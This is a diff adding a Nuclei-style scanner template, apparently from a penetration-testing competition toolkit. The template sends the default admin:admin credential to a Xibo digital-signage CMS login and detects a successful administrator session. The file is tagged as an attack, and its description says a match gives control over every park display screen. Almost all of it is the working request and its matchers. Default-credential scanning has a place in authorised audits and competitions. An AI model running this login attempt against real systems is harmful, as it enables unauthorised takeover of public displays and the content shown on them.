@@ -1,0 +1,51 @@
+# Xibo CMS default credential login attempt.
+id: xibo-default-login
+
+info:
+  name: Xibo CMS Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    Xibo is digital-signage CMS used for park-wide queue, wayfinding and
+    promotion displays. Stock installs document the default administrator
+    credential admin:admin and older builds do not force a change.
+
+    This template POSTs the default credential to the Xibo web login. A
+    match means full CMS administration: every display, layout and schedule
+    in the park is attacker-controllable - media replacement pushes content
+    to every registered player screen immediately.
+
+    One POST request. The credential is a documented vendor default.
+  reference:
+    - https://xibosignage.com/
+  tags: signage,xibo,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /web/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin&login=Login
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Displays"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Password incorrect"
+          - 'name="password"'
